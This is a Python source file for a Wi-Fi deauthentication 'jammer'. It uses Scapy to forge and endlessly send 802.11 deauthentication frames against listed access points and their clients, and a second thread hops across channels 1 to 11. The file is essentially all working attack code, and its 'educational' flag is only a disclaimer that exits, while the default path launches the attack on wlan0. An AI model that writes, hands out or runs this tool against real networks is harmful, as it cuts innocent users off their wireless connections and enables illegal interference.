import argparse
import random
from collections import namedtuple
from threading import Thread, Lock
from time import sleep
from subprocess import Popen, DEVNULL, PIPE
from scapy.all import Dot11, Dot11Deauth, send, conf

AccessPoint = namedtuple("AccessPoint", ["ssid", "bssid", "channel"])
Client = namedtuple("Client", ["mac", "channel"])

conf.verb = 0  # Disable Scapy verbosity to avoid unnecessary printouts

def parse_args():
    parser = argparse.ArgumentParser(description="WiFi Jammer (Real-Time Mode)")
    parser.add_argument('--educational', action='store_true', help="Run the script in educational mode")
    return parser.parse_args()

class AirDeauthenticator:
    def __init__(self):
        self.deauth_running = False
        self.running_interface = None
        self.deauth_thread = None
        self.channel_hopper_thread = None
        self.channel_lock = Lock()
        self.current_channel = 3
        self.targeted_only = False
        self._burst_count = 500
        self._bssids_to_deauth = []
        self._clients_to_deauth = {}

    def add_bssid(self, bssid):
        self._bssids_to_deauth.append(bssid)

    def add_client(self, client, bssid):
        self._clients_to_deauth[client] = bssid

    def set_burst_count(self, count):
        self._burst_count = count

    def hop_channels(self, interface, hop_interval):
        while self.deauth_running:
            with self.channel_lock:
                print(f"Hopping to channel {self.current_channel}")
                Popen(['iw', 'dev', interface, 'set', 'channel', str(self.current_channel)], stdout=DEVNULL, stderr=PIPE)
                self.current_channel += 1
                if self.current_channel > 11:
                    self.current_channel = 1
            sleep(hop_interval)

    def deauthentication_attack(self, interface):
        packets = []
        if not self.targeted_only:
            for bssid in self._bssids_to_deauth:
                deauth_packet = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid) / Dot11Deauth()
                packets.append(deauth_packet)
        for client in self._clients_to_deauth.keys():
            bssid = self._clients_to_deauth[client]
            deauth_packet1 = Dot11(addr1=bssid, addr2=client, addr3=client) / Dot11Deauth()
            deauth_packet2 = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
            packets.append(deauth_packet1)
            packets.append(deauth_packet2)
        count = self._burst_count if self._burst_count > 0 else 5
        while self.deauth_running:
            for packet in packets:
                send(packet, iface=interface, count=1, inter=0.1)
            count -= 1
        self.deauth_running = False
        self.running_interface = None

    def start_deauthentication_attack(self, interface, hop_interval=5):
        self.running_interface = interface
        self.deauth_running = True
        self.deauth_thread = Thread(target=self.deauthentication_attack, args=(interface,))
        self.channel_hopper_thread = Thread(target=self.hop_channels, args=(interface, hop_interval,))
        self.deauth_thread.start()
        self.channel_hopper_thread.start()

def main():
    args = parse_args()
    if args.educational:
        print("Error: Real-time mode requires root privileges and is for educational purposes only.")
        return

    deauthenticator = AirDeauthenticator()
    deauthenticator.set_burst_count(100)
    
    # For real-world use, you'll need to add actual BSSIDs and clients
    deauthenticator.add_bssid("XX:XX:XX:XX:XX:XX")  # Replace with actual BSSID
    deauthenticator.add_client("YY:YY:YY:YY:YY:YY", "XX:XX:XX:XX:XX:XX")  # Replace with actual client MAC and its associated BSSID
    
    deauthenticator.start_deauthentication_attack("wlan0")  # Ensure wlan0 is in monitor mode

if __name__ == "__main__":
    main()
